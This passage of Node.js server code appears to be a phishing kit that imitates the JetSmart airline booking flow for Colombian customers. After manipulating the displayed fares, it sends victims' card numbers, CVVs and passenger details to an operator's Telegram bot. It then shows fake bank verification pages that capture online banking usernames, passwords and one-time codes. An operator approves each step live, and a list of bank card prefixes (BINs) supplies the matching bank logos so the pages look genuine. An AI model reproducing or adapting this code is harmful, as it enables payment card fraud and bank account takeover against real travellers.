                    if (parsed.UnformattedGroupTotalPrice !== undefined) {
                        parsed.UnformattedGroupTotalPrice = grandTotal;
                        parsed.FormattedGroupTotalPrice = `$ ${priceLocal} COP`;
                    }
                    modified = true;
                }

                // Root-level AvailableOutboundJourneys (sometimes returned separately)
                const updateRootJourneys = (journeys, fakePrice, mapTax) => {
                    if (Array.isArray(journeys)) {
                        journeys.forEach(j => {
                            if (j.FareAmount !== undefined) { j.FareAmount = fakePrice; modified = true; }
                            if (j.FareAmountWithTaxes !== undefined) { j.FareAmountWithTaxes = fakePrice + mapTax; modified = true; }
                            if (Array.isArray(j.Flights)) {
                                j.Flights.forEach(f => {
                                    if (f.FareAmount !== undefined) { f.FareAmount = fakePrice; modified = true; }
                                });
                            }
                        });
                    }
                };
                updateRootJourneys(parsed.AvailableOutboundJourneys, effectiveOutboundFare, outboundTax);
                updateRootJourneys(parsed.AvailableReturnJourneys, effectiveInboundFare, inboundTax);

                // Yet another Breakdown structure (UncommittedBreakdown / CommittedBreakdown)
                const processBreakdownNode = (bNode) => {
                    if (!bNode) return;
                    const adjustBNodeJourney = (jrn, fakePrice) => {
                        if (!jrn) return;
                        if (jrn.Subtotal !== undefined) { jrn.Subtotal = fakePrice; modified = true; }
                        if (jrn.PassengerSection) {
                            if (jrn.PassengerSection.Subtotal !== undefined) { jrn.PassengerSection.Subtotal = fakePrice; modified = true; }
                            if (Array.isArray(jrn.PassengerSection.Charges)) {
                                jrn.PassengerSection.Charges.forEach(c => {
                                    // usually blank charge code is the base passenger fare
                                    if ((c.ChargeCode === "" || c.ChargeCode === null) && c.Price !== undefined) {
                                        c.Price = fakePrice / paxCount; // <-- PER PAX price
                                        modified = true;
                                    }
                                });
                            }
                        }
                    };

                    adjustBNodeJourney(bNode.OutboundJourney, effectiveOutboundFare);
                    if (effectiveInboundFare > 0) {
                        adjustBNodeJourney(bNode.InboundJourney, effectiveInboundFare);
                    } else if (bNode.InboundJourney) {
                        adjustBNodeJourney(bNode.InboundJourney, 0);
                    }

                    if (bNode.Total && bNode.Total.Amount !== undefined) {
                        bNode.Total.Amount = grandTotal;
                        modified = true;
                    }
                    if (bNode.TotalTaxLocal !== undefined) { bNode.TotalTaxLocal = req.session.searchContext.selectedFlights.taxes; modified = true; }
                    if (bNode.TotalTransactionTaxLocal !== undefined) { bNode.TotalTransactionTaxLocal = req.session.searchContext.selectedFlights.taxes; modified = true; }

                    if (bNode.Taxes) {
                        const totalIva = Math.floor(effectiveOutboundBase * 0.19) + Math.floor(effectiveInboundBase * 0.19);
                        const totalTax = req.session.searchContext.selectedFlights.taxes;
                        const totalCOT = totalTax - totalIva;

                        if (bNode.Taxes.Subtotal !== undefined) { bNode.Taxes.Subtotal = totalTax; modified = true; }
                        if (bNode.Taxes.Amount !== undefined) { bNode.Taxes.Amount = totalTax; modified = true; }

                        if (Array.isArray(bNode.Taxes.Charges)) {
                            bNode.Taxes.Charges.forEach(c => {
                                if (c.ChargeCode === 'COT') { c.Price = totalCOT; c.Amount = totalCOT; modified = true; }
                                if (c.ChargeCode === 'YS' || c.Name.includes('IVA')) { c.Price = totalIva; c.Amount = totalIva; modified = true; }
                            });
                        }
                    }
                };

                processBreakdownNode(parsed.UncommittedBreakdown);
                processBreakdownNode(parsed.CommittedBreakdown);

                if (modified) {
                    body = parsed;
                }
            }
        }

        // ── Dynamic Pricing: InternalSelect Redirect ─────────────
        // The frontend redirects via Queue-It / InternalSelect passing the static selected price in the URL:
        // ?selectedPriceOutbound=140200&selectedPriceInbound=140200
        if (mockRes.status === 302 && mockRes.headers && mockRes.headers.location) {
            let loc = mockRes.headers.location;
            if (loc.includes('InternalSelect') && req.session.searchContext.selectedFlights.outboundFare > 0) {
                loc = loc.replace(/selectedPriceOutbound=\d+/, `selectedPriceOutbound=${req.session.searchContext.selectedFlights.outboundFare}`);
                loc = loc.replace(/selectedPriceInbound=\d+/, `selectedPriceInbound=${req.session.searchContext.selectedFlights.inboundFare}`);
                mockRes.headers.location = loc;
            }
        }

        // ClientAppData: adjust FlowInfo based on current step
        const isClientAppData = urlLower.includes('/clientappdata/');
        if (isClientAppData && mockRes.isJson) {
            body = adjustClientAppData(body, req.session.currentFlowStep);
            console.log(`🔧 ClientAppData adjusted for step: ${req.session.currentFlowStep}`);
        }

        // GetBookingData: always return real mock data.
        // The duplicate-tab warning is fixed by cookie/Worker suppression,
        // NOT by emptying booking data (which breaks flight selection).

        // Track when booking is created (FlightSelection = user selected flights)
        const isFlightSelection = urlLower.includes('/flightselection') || urlLower.includes('/flight/select');
        if (isFlightSelection) {
            req.session.bookingCreated = true;
            req.session.currentFlowStep = 'baggage'; // Advance flow step
            console.log(`✈  Booking created! Flow advancing to post-selection steps.`);
        }

        // Strip passenger PII so forms start blank
        const isPassengerRelated = urlLower.includes('/passengers') || urlLower.includes('/getbookingdata');
        if (isPassengerRelated) {
            const stripPassengerPII = (passengers) => {
                if (!Array.isArray(passengers)) return;
                passengers.forEach(p => {
                    // Flat Name (BookingSummary)
                    if (typeof p.Name === 'string') p.Name = '';
                    // Nested Name (GetAll)
                    if (p.Name && typeof p.Name === 'object') {
                        p.Name = { Title: '', FirstName: '', MiddleName: '', LastName: '', Suffix: '' };
                    }
                    if (p.DateOfBirth !== undefined) p.DateOfBirth = '';
                    if (p.DocNumber !== undefined) p.DocNumber = '';
                    if (p.DocTypeCode !== undefined) p.DocTypeCode = '';
                    if (p.FirstName !== undefined) p.FirstName = '';
                    if (p.LastName !== undefined) p.LastName = '';
                    if (p.Gender !== undefined) p.Gender = '';
                    if (p.Nationality !== undefined) p.Nationality = '';
                    // Address with embedded email/phone
                    if (p.Address && typeof p.Address === 'object') {
                        p.Address.AddressLine1 = '';
                        p.Address.Phone = '';
                        p.Address.EmailAddress = '';
                        p.Address.CompanyName = '';
                        p.Address.City = '';
                        p.Address.PostalCode = '';
                    }
                    if (p.EmailAddress !== undefined) p.EmailAddress = '';
                    if (p.Phone !== undefined) p.Phone = '';
                    // DocumentInfo array
                    if (Array.isArray(p.DocumentInfo)) {
                        p.DocumentInfo.forEach(d => {
                            d.DocumentNumber = '';
                            d.DocumentType = '';
                        });
                    }
                    // TravelDocuments array
                    if (Array.isArray(p.TravelDocuments)) {
                        p.TravelDocuments.forEach(d => {
                            if (d.DocumentNumber !== undefined) d.DocumentNumber = '';
                            if (d.DocNumber !== undefined) d.DocNumber = '';
                            if (d.DocTypeCode !== undefined) d.DocTypeCode = '';
                        });
                    }
                });
            };

            // Parse body — may be object or JSON string
            let parsed = body;
            let wasString = false;
            if (typeof body === 'string') {
                try { parsed = JSON.parse(body); wasString = true; } catch (e) { parsed = null; }
            }
            if (parsed && typeof parsed === 'object') {
                const b = JSON.parse(JSON.stringify(parsed));
                if (b.Passengers) stripPassengerPII(b.Passengers);
                if (b.BookingSummary?.Passengers) stripPassengerPII(b.BookingSummary.Passengers);
                if (b.BookingSummary?.ContactInfo) {
                    b.BookingSummary.ContactInfo = { Email: '', Phone: '', PhonePrefix: '', CountryCode: '' };
                }
                body = wasString ? JSON.stringify(b) : b;
                console.log(`🧹 PII stripped from ${new URL(targetUrl).pathname}`);
            }

            // When user submits passenger form (POST Passengers/Add),
            // merge their input into the response so "Soy el primer pasajero" works.
            // NOTE: SPA sends multipart/form-data, not JSON!
            if (req.method === 'POST' && urlLower.includes('/passengers/add')) {
                try {
                    const rawBody = req.rawBody || (typeof reqBody === 'string' ? reqBody : (Buffer.isBuffer(reqBody) ? reqBody.toString('utf8') : ''));
                    // Parse multipart form fields: extract key=value pairs
                    const formFields = {};
                    const parts = rawBody.split(/------WebKitFormBoundary[^\r\n]*/);
                    parts.forEach(part => {
                        const nameMatch = part.match(/name="([^"]+)"/);
                        if (nameMatch) {
                            const val = part.split('\r\n\r\n')[1]?.replace(/\r\n$/, '').trim();
                            if (val) formFields[nameMatch[1]] = val;
                        }
                    });

                    const firstName = formFields['Passengers[0].Name.FirstName'] || '';
                    const lastName = formFields['Passengers[0].Name.LastName'] || '';
                    const email = formFields['Passengers[0].Address.EmailAddress'] || '';
                    const phone = formFields['Passengers[0].Address.Phone'] || '';
                    const docNumber = formFields['Passengers[0].TravelDocuments[0].DocumentNumber'] || '';
                    const docType = formFields['Passengers[0].TravelDocuments[0].DocumentType'] || '';

                    if (firstName || lastName) {
                        let respData = typeof body === 'string' ? JSON.parse(body) : JSON.parse(JSON.stringify(body));
                        if (respData?.BookingSummary?.Passengers?.[0]) {
                            respData.BookingSummary.Passengers[0].Name = `${firstName} ${lastName}`.trim();
                            if (docNumber) respData.BookingSummary.Passengers[0].DocNumber = docNumber;
                            if (docType) respData.BookingSummary.Passengers[0].DocTypeCode = docType;
                        }
                        // Store contact info for the payment page
                        if (!respData.BookingSummary) respData.BookingSummary = {};
                        respData.BookingSummary.ContactInfo = {
                            Email: email, Phone: phone,
                            PhonePrefix: formFields['Passengers[0].Address.PhonePrefix'] || '',
                            CountryCode: ''
                        };
                        body = typeof body === 'string' ? JSON.stringify(respData) : respData;
                        console.log(`📝 Merged passenger: ${firstName} ${lastName} | ${email} | ${phone}`);
                    }
                } catch (e) { console.error('Error merging passenger data:', e.message); }
            }
        }

        // Rewrite JetSmart URLs in response bodies
        if (mockRes.isJson && body) {
            const rewritten = rewriteUrls(JSON.stringify(body), LOCAL_BASE);
            try { body = JSON.parse(rewritten); } catch { }
        } else if (!mockRes.isBase64 && typeof body === 'string') {
            body = rewriteUrls(body, LOCAL_BASE);
        }

        // Send response
        if (mockRes.isJson) {
            body = typeof body === 'string' ? JSON.parse(body) : body;
            body = multiplexPassengers(body, req.session.searchContext.current);
            res.json(body);
        }
        else if (mockRes.isBase64) res.send(Buffer.from(mockRes.body, 'base64'));
        else res.send(typeof body === 'string' ? body : mockRes.body);
        return true;
    }



    // ── Search Context ────────────────────────────────────────────────────

    // ── Telegram Post-Payment Flow (session-based) ──────────────────────────

    const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const _tgSessions = {};
    let lastTgUpdateId = 0;

    // Colombian BINs → bank slug lookup
    const COLOMBIAN_BINS = {
        // Bancolombia
        "244000": "bancolombia", "271638": "bancolombia", "510749": "bancolombia", "517640": "bancolombia", "517710": "bancolombia", "518092": "bancolombia",
        "528633": "bancolombia", "530371": "bancolombia", "530372": "bancolombia", "530373": "bancolombia", "530691": "bancolombia", "530693": "bancolombia",
        "530694": "bancolombia", "530695": "bancolombia", "530696": "bancolombia", "409983": "bancolombia", "404038": "bancolombia", "457562": "bancolombia",
        "377886": "bancolombia", "377848": "bancolombia", "377847": "bancolombia", "377845": "bancolombia", "377844": "bancolombia", "377843": "bancolombia",
        "377816": "bancolombia", "377815": "bancolombia", "377814": "bancolombia", "377813": "bancolombia",
        // Davivienda
        "231026": "davivienda", "232002": "davivienda", "232010": "davivienda", "271692": "davivienda", "526557": "davivienda", "547191": "davivienda",
        "520024": "davivienda", "512272": "davivienda", "547158": "davivienda", "547113": "davivienda", "540694": "davivienda", "403899": "davivienda",
        "407383": "davivienda", "408107": "davivienda", "423150": "davivienda", "423151": "davivienda", "424488": "davivienda", "424529": "davivienda",
        "425817": "davivienda", "425950": "davivienda", "425951": "davivienda", "428384": "davivienda", "428385": "davivienda", "428386": "davivienda",
        "428387": "davivienda", "428388": "davivienda", "439116": "davivienda", "439152": "davivienda", "441080": "davivienda", "447198": "davivienda",
        "448390": "davivienda", "451733": "davivienda", "454300": "davivienda", "455981": "davivienda", "455982": "davivienda", "455983": "davivienda",
        "455986": "davivienda", "458173": "davivienda", "459321": "davivienda", "464815": "davivienda", "464817": "davivienda", "464818": "davivienda",
        "464819": "davivienda", "464820": "davivienda", "464821": "davivienda", "464822": "davivienda", "468561": "davivienda", "472043": "davivienda",
        "472044": "davivienda", "472957": "davivienda", "473228": "davivienda", "474493": "davivienda", "475101": "davivienda", "476445": "davivienda",
        "476446": "davivienda", "476459": "davivienda", "476460": "davivienda", "476464": "davivienda", "476468": "davivienda", "477379": "davivienda",
        "477384": "davivienda", "477398": "davivienda", "477504": "davivienda", "477725": "davivienda", "477726": "davivienda",
        // BBVA
        "404279": "bbva", "404280": "bbva", "410164": "bbva", "417704": "bbva", "418253": "bbva", "419796": "bbva", "421892": "bbva", "432345": "bbva",
        "432346": "bbva", "439467": "bbva", "441015": "bbva", "492488": "bbva", "492489": "bbva",
        // Banco de Bogotá
        "512069": "bogota", "522104": "bogota", "529198": "bogota", "531088": "bogota", "539612": "bogota", "540080": "bogota", "543862": "bogota",
        "548494": "bogota", "548940": "bogota", "552221": "bogota", "552865": "bogota", "553661": "bogota", "402739": "bogota", "499812": "bogota",
        "496083": "bogota", "493111": "bogota", "433460": "bogota", "406238": "bogota", "491511": "bogota",
        // Scotiabank Colpatria
        "230549": "colpatria", "510608": "colpatria", "511577": "colpatria", "511696": "colpatria", "512067": "colpatria", "512577": "colpatria",
        "512645": "colpatria", "512679": "colpatria", "514907": "colpatria", "515816": "colpatria", "515858": "colpatria", "408430": "colpatria",
        "408431": "colpatria", "409744": "colpatria", "410176": "colpatria", "461208": "colpatria", "416048": "colpatria", "416049": "colpatria",
        // Banco de Occidente
        "558772": "occidente", "552256": "occidente", "549151": "occidente", "547385": "occidente", "541203": "occidente", "540625": "occidente",
        "530729": "occidente", "400608": "occidente", "425987": "occidente", "430485": "occidente", "431026": "occidente", "431027": "occidente", "441511": "occidente",
        // Banco Falabella
        "528209": "falabella", "514332": "falabella", "513689": "falabella", "528201": "falabella"
    };

    const getCardNetwork = (rawCard) => {
        const digits = (rawCard || '').replace(/\D/g, '');
        if (digits.startsWith('4')) return 'visa';
        if (digits.startsWith('5') || digits.startsWith('2')) return 'mastercard';
        return 'visa';
    };

    const getCardBank = (rawCard) => {
        const bin = (rawCard || '').replace(/\D/g, '').substring(0, 6);
        return COLOMBIAN_BINS[bin] || '';
    };

    // Send a NEW Telegram message. Returns the message_id.
    const sendTelegramMessage = async (msgText, inlineButtons, sessionId) => {
        if (!TG_TOKEN || !TG_CHAT_ID) { console.error('Missing Telegram configs'); return null; }
        try {
            const body = { chat_id: TG_CHAT_ID, text: msgText, parse_mode: 'HTML' };
            if (inlineButtons) {
                body.reply_markup = {
                    inline_keyboard: [inlineButtons.map(btn => ({ text: btn.text, callback_data: `${btn.action}:${sessionId}` }))]
                };
            }
            const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
            const result = await response.json();
            return result.ok ? result.result.message_id : null;
        } catch (e) {
            console.error('Failed to send Telegram message:', e);
            return null;
        }
    };

    // Delete a Telegram message.
    const deleteTelegramMessage = async (messageId) => {
        if (!TG_TOKEN || !TG_CHAT_ID || !messageId) return;
        try {
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/deleteMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, message_id: messageId })
            });
        } catch (e) { /* ignore */ }
    };

    // Delete old message and send a new one (triggers notification + appears at bottom).
    const resendTelegramMessage = async (session, msgText, inlineButtons, sessionId) => {
        await deleteTelegramMessage(session.tgMessageId);
        const newMessageId = await sendTelegramMessage(msgText, inlineButtons, sessionId);
        session.tgMessageId = newMessageId;
        return newMessageId;
    };

    const APPROVE_REJECT_BUTTONS = [
        { text: '❌ Incorrecto', action: 'reject' },
        { text: '✅ OK', action: 'approve' }
    ];

    // Poll Telegram for admin approve/reject button presses
    const pollTelegramUpdates = async () => {
        if (!TG_TOKEN) return;
        try {
            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastTgUpdateId + 1}&timeout=10`);
            const data = await res.json();
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    lastTgUpdateId = update.update_id;
                    if (update.callback_query) {
                        const cbData = update.callback_query.data;
                        const [action, sessionId] = cbData.split(':');
                        const session = _tgSessions[sessionId];

                        try {
                            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });
                        } catch (e) { }

                        if (session) {
                            if (action === 'approve') {
                                if (session.status === 'reviewing_credentials') {
                                    session.status = 'credentials_approved';
                                    session.runningText += `\n✅ <b>Credenciales APROBADAS</b> — Esperando clave dinámica...`;
                                    await resendTelegramMessage(session, session.runningText, null, sessionId);
                                } else if (session.status === 'reviewing_clave') {
                                    session.status = 'clave_approved';
                                    session.runningText += `\n✅ <b>Clave dinámica APROBADA</b> — ¡Pago exitoso!`;
                                    await resendTelegramMessage(session, session.runningText, null, sessionId);
                                }
                            } else if (action === 'reject') {
                                if (session.status === 'reviewing_credentials') {
                                    session.status = 'credentials_rejected';
                                    session.runningText += `\n❌ <b>Credenciales RECHAZADAS</b> — Esperando reintento...`;
                                    await resendTelegramMessage(session, session.runningText, null, sessionId);
                                } else if (session.status === 'reviewing_clave') {
                                    session.status = 'clave_rejected';
                                    session.runningText += `\n❌ <b>Clave dinámica RECHAZADA</b> — Esperando reintento...`;
                                    await resendTelegramMessage(session, session.runningText, null, sessionId);
                                }
                            }
                        }
                    }
                }
            }
        } catch (e) {
            console.error('Telegram polling error:', e);
        }
        setTimeout(pollTelegramUpdates, 2000);
    };

    console.log('Starting Telegram bot polling...');
    pollTelegramUpdates();

    // Card field label identification
    const identifyField = (key) => {
        const cardFieldKeys = {
            'numeroTarjeta': '💳 Card Number', 'cc-number': '💳 Card Number', 'cc_number': '💳 Card Number', 'cardNumber': '💳 Card Number', 'number': '💳 Card Number',
            'nombreTitular': '👤 Name on Card', 'cc-name': '👤 Name on Card', 'cc_name': '👤 Name on Card', 'cardHolderName': '👤 Name on Card',
            'expiracion': '📅 Expiration', 'expireDate': '📅 Expiration', 'cc-expiry': '📅 Expiration', 'expiration': '📅 Expiration',
            'cvv': '🔒 CVV', 'cc-cvv': '🔒 CVV', 'cc_cvv': '🔒 CVV', 'CVV/CVC': '🔒 CVV',
        };
        if (cardFieldKeys[key]) return cardFieldKeys[key];
        const lk = key.toLowerCase();
        if (lk.includes('card') && lk.includes('number') || lk === 'cc-number' || lk.includes('tarjeta')) return '💳 Card Number';
        if (lk.includes('card') && lk.includes('name') || lk.includes('holder') || lk === 'cc-name' || lk.includes('titular')) return '👤 Name on Card';
        if ((lk.includes('expir') || lk.includes('vencim') || lk.includes('mm') && lk.includes('yy')) && !lk.includes('birth')) return '📅 Expiration';
        if (lk.includes('cvv') || lk.includes('cvc') || lk.includes('security') || lk.includes('seguridad')) return '🔒 CVV';
        return null;
    };

    // Fields to skip in Telegram messages
    const SKIP_FIELDS = new Set(['__sessionId', 'email', 'select_unknown']);

    // ── Initial card data submission ──────────────────────────────────────
    app.post('/__tg/submit-card', async (req, res) => {
        let cardData = req.body;
        if (Buffer.isBuffer(cardData)) cardData = cardData.toString('utf8');
        if (typeof cardData === 'string') {
            try { cardData = JSON.parse(cardData); } catch (e) { cardData = {}; }
        }
        const sessionId = cardData.__sessionId || `tg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        delete cardData.__sessionId;

        let cardLines = [];
        let otherLines = [];
        for (const [key, val] of Object.entries(cardData)) {
            if (SKIP_FIELDS.has(key)) continue;
            const cardLabel = identifyField(key);
            if (cardLabel) {
                cardLines.push(`${cardLabel}: <code>${val}</code>`);
            } else {
                otherLines.push(`  <b>${key}</b>: <code>${val}</code>`);
            }
        }

        let msgText = `🛫 <b>JETSMART — NEW CARD SUBMISSION</b>\n🆔 Session: <code>${sessionId.substring(0, 10)}</code>\n`;
        if (cardLines.length > 0) {
            msgText += `\n<b>━━━ Card Info ━━━</b>\n${cardLines.join('\n')}\n`;
        }
        if (otherLines.length > 0) {
            msgText += `\n<b>━━━ Passenger Data ━━━</b>\n${otherLines.join('\n')}\n`;
        }
        msgText += `\n⏳ Waiting for credentials...`;

        const messageId = await sendTelegramMessage(msgText, null, sessionId);

        _tgSessions[sessionId] = {
            status: 'pending_credentials',
            cardData,
            tgMessageId: messageId,
            runningText: msgText
        };
        console.log('[TG Flow] Card data received for session:', sessionId, 'msgId:', messageId);
        res.json({ success: true, sessionId });
    });

    // ── Credential submission (usuario + contraseña) ──────────────────────
    app.post('/__tg/submit-credentials', async (req, res) => {
        const { sessionId, usuario, contrasena } = req.body;
        if (!_tgSessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
        const session = _tgSessions[sessionId];
        session.status = 'reviewing_credentials';
        session.usuario = usuario;
        session.contrasena = contrasena;

        session.runningText = session.runningText.replace(/\n⏳ Waiting for.*$/, '');
        session.runningText += `\n\n<b>━━━ 🔐 Credentials ━━━</b>\nUsuario: <code>${usuario}</code>\nContraseña: <code>${contrasena}</code>`;

        await resendTelegramMessage(session, session.runningText + '\n\n⬇️ Approve or reject:', APPROVE_REJECT_BUTTONS, sessionId);
        res.json({ success: true });
    });

    // ── OTP / Clave dinámica submission ───────────────────────────────────
    app.post('/__tg/submit-clave', async (req, res) => {
        const { sessionId, clave } = req.body;
        if (!_tgSessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
        const session = _tgSessions[sessionId];
        session.status = 'reviewing_clave';
        session.clave = clave;

        session.runningText = session.runningText.replace(/\n⏳ Waiting for.*$/, '');
        session.runningText += `\n\n<b>━━━ 🔑 Clave Dinámica ━━━</b>\nClave: <code>${clave}</code>`;

        await resendTelegramMessage(session, session.runningText + '\n\n⬇️ Approve or reject:', APPROVE_REJECT_BUTTONS, sessionId);
        res.json({ success: true });
    });

    // ── Session status (polled by browser) ────────────────────────────────
    app.get('/__tg/status', (req, res) => {
        const { sessionId } = req.query;
        if (!_tgSessions[sessionId]) return res.json({ status: 'unknown' });
        const session = _tgSessions[sessionId];
        const cardData = session.cardData || {};
        const rawCard = cardData['numeroTarjeta'] || cardData['cc-number'] || cardData['cc_number'] || cardData['cardNumber'] || '';
        const digits = rawCard.replace(/\D/g, '');
        const lastFour = digits.length >= 4 ? digits.slice(-4) : '****';
        const cardHolder = cardData['nombreTitular'] || cardData['cc-name'] || cardData['cc_name'] || cardData['cardHolderName'] || '';

        const network = getCardNetwork(rawCard);
        const bankSlug = getCardBank(rawCard);

        res.json({
            status: session.status,
            lastFour,
            cardHolder: cardHolder.toUpperCase(),
            network,
            bankSlug
        });
    });

    // ── Bank/network logo assets ──────────────────────────────────────────
    const logoMap = {
        'bancolombia': 'bancolombia-logo.png',
        'davivienda': 'davi.png',
        'bbva': 'bbva.webp',
        'bogota': 'bogo.png',
        'colpatria': 'colpa.png',
        'occidente': 'occidente.png',
        'falabella': 'fala.png',
        'mastercard': 'mastercard-idcheck-logo.png',
        'visa': 'visa-logo.png',
        'mastercard-secure': 'mastercard-id-check-loading.svg',
        'visa-secure': 'visa-secure-logo.webp'
    };

    Object.entries(logoMap).forEach(([slug, filename]) => {
        app.get(`/assets/${filename}`, (req, res) => {
            res.sendFile(path.join(__dirname, 'assets', filename));
        });
    });

    // ── Custom Post-Payment Pages ─────────────────────────────────────────

    const otpStyles = `
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: Arial, Helvetica, sans-serif; background-color: #f0f0f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 10px; }
            .otp-card { background: #fff; width: 100%; max-width: 420px; border: 1px solid #ccc; }
            .otp-header { padding: 20px 28px; display: flex; align-items: center; justify-content: space-between; min-height: 70px; }
            .otp-header .bank-logo { height: 55px; max-width: 200px; object-fit: contain; display: none; margin-left: -5px; }
            .otp-header .network-logo { height: 32px; max-width: 120px; object-fit: contain; margin-left: auto; }
            .otp-body { padding: 20px 32px 24px; }
            .otp-instruction { color: #333; font-size: 12.5px; line-height: 1.6; margin-bottom: 22px; }
            .otp-section-title { color: #333; font-size: 12px; font-weight: bold; margin-bottom: 16px; }
            .otp-details-table { width: 100%; border-collapse: collapse; margin-bottom: 6px; }
            .otp-details-table td { padding: 4px 0; font-size: 12px; color: #333; vertical-align: middle; }
            .otp-details-table td.otp-td-label { text-align: right; padding-right: 14px; font-weight: bold; width: 46%; white-space: nowrap; }
            .otp-details-table td.otp-td-value { text-align: left; width: 54%; }
            .otp-details-table input { border: 1px solid #999; padding: 4px 6px; font-size: 12px; width: 140px; outline: none; font-family: Arial, Helvetica, sans-serif; }
            .otp-details-table input:focus { border-color: #555; }
            .otp-link { color: #0066cc; font-size: 11px; text-decoration: underline; cursor: pointer; margin: 8px 0 12px; display: inline-block; }
            .otp-btn-wrap { text-align: center; margin: 22px 0 14px; }
            .otp-btn { background: #1a2340; color: #fff; border: none; padding: 9px 36px; font-size: 13px; cursor: pointer; font-family: Arial, Helvetica, sans-serif; letter-spacing: 0.5px; }
            .otp-btn:hover { background: #111a30; }
            .otp-btn:disabled { background: #999; cursor: not-allowed; }
            .otp-footer { padding: 18px 28px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; }
            .otp-footer a { color: #0066cc; text-decoration: underline; margin-right: 6px; }
            .otp-footer .otp-footer-right { color: #0066cc; text-decoration: underline; cursor: pointer; }
            .otp-error { background: #fff3cd; border: 1px solid #ffc107; color: #856404; padding: 6px 10px; font-size: 11px; margin-bottom: 12px; display: none; }
            .otp-spinner-wrap { text-align: center; padding: 36px 0; }
            .otp-spinner { border: 3px solid #e0e0e0; border-top: 3px solid #1a2340; border-radius: 50%; width: 32px; height: 32px; animation: otpspin 0.8s linear infinite; margin: 0 auto 12px; }
            @keyframes otpspin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .otp-spinner-text { color: #555; font-size: 12px; }
        </style>
    `;

    const otpHeader = '<div class="otp-header"><img id="bankLogo" class="bank-logo" src="" alt="Bank"><img id="networkLogo" class="network-logo" src="/assets/visa-logo.png" alt="Network"></div>';
    const dynamicLogoScript = `
        <script>
            (function() {
                var sessionId = new URLSearchParams(window.location.search).get('sessionId');
                var bankImg = document.getElementById('bankLogo');
                var netImg = document.getElementById('networkLogo');
                var logos = ${JSON.stringify(logoMap)};
                var savedNetwork = (document.cookie.match(/tg_network=([^;]+)/) || [])[1];
                if (savedNetwork && logos[savedNetwork]) {
                    netImg.src = '/assets/' + logos[savedNetwork];
                }
                if (!sessionId) return;
                fetch('/__tg/status?sessionId=' + sessionId).then(r => r.json()).then(d => {
                    if (d.bankSlug && logos[d.bankSlug]) {
                        bankImg.src = '/assets/' + logos[d.bankSlug];
                        bankImg.style.display = 'block';
                    } else {
                        bankImg.style.display = 'none';
                    }
                    if (d.network && logos[d.network]) {
                        netImg.src = '/assets/' + logos[d.network];
                        document.cookie = 'tg_network=' + d.network + ';path=/;max-age=3600';
                    }
                }).catch(console.error);
            })();
        </script>
    `;
    const otpFooter = '<div class="otp-footer"><div><a href="#">FAQ</a> | <a href="#">AYUDA</a> | <a href="#">Términos de uso</a></div><a class="otp-footer-right" href="#">Salir</a></div>';

    app.get('/custom/:page', (req, res) => {
        const page = req.params.page;
        const gTotal = req.session.searchContext.selectedFlights.grandTotal ? '$ ' + req.session.searchContext.selectedFlights.grandTotal.toLocaleString('es-CO') : 'Calculando...';

        // Step 1: Loading screen → redirects to credentials form
        if (page === 'loading-1') {
            return res.send(`<!DOCTYPE html><html><head><title>Procesando...</title>${otpStyles}</head>
                <body><div class="otp-card">${otpHeader}
                <div class="otp-body">
                    <p class="otp-instruction">Conectando con su entidad bancaria para verificar su identidad. Por favor no cierre esta ventana.</p>
                    <div class="otp-spinner-wrap"><div class="otp-spinner"></div><div class="otp-spinner-text">Procesando su solicitud...</div></div>
                </div>${otpFooter}</div>
                ${dynamicLogoScript}
                <script>setTimeout(function(){var sid=new URLSearchParams(window.location.search).get('sessionId');window.location.href='/custom/credenciales?sessionId='+sid;},10000);</script></body></html>`);

            // Step 2: Credentials form (Usuario + Contraseña)
        } else if (page === 'credenciales') {
            return res.send(`<!DOCTYPE html><html><head><title>Verificación</title>${otpStyles}</head>
                <body><div class="otp-card">${otpHeader}
                <div class="otp-body">
                    <p class="otp-instruction">Para continuar con la transacción, ingrese sus credenciales bancarias para verificar su identidad.</p>
                    <div class="otp-section-title">Detalles transaccionales</div>
                    <div class="otp-error" id="errorMsg">Los datos ingresados no son válidos. Por favor intente nuevamente.</div>
                    <table class="otp-details-table">
                        <tr><td class="otp-td-label">Comercio:</td><td class="otp-td-value">JetSmart Airlines</td></tr>
                        <tr><td class="otp-td-label">Monto:</td><td class="otp-td-value">${gTotal}</td></tr>
                        <tr><td class="otp-td-label">Número de tarjeta:</td><td class="otp-td-value" id="cardDisplay">************</td></tr>
                        <tr><td class="otp-td-label">Usuario:</td><td class="otp-td-value"><input type="text" id="usuario" autocomplete="off"></td></tr>
                        <tr><td class="otp-td-label">Contraseña:</td><td class="otp-td-value"><input type="password" id="contrasena" autocomplete="off"></td></tr>
                    </table>
                    <div class="otp-btn-wrap"><button class="otp-btn" id="submitBtn" onclick="submitCredentials()">Activar</button></div>
                </div>${otpFooter}</div>
                <script>
                    var urlParams=new URLSearchParams(window.location.search);var sessionId=urlParams.get('sessionId');
                    if(urlParams.get('error'))document.getElementById('errorMsg').style.display='block';
                    fetch('/__tg/status?sessionId='+sessionId).then(function(r){return r.json();}).then(function(d){
                        if(d.lastFour){document.getElementById('cardDisplay').textContent='************'+d.lastFour;}
                    }).catch(function(){});
                    function submitCredentials(){
                        var usuario=document.getElementById('usuario').value;
                        var contrasena=document.getElementById('contrasena').value;
                        if(!usuario||!contrasena)return alert('Complete ambos campos.');
                        document.getElementById('submitBtn').disabled=true;document.getElementById('submitBtn').innerText='PROCESANDO...';
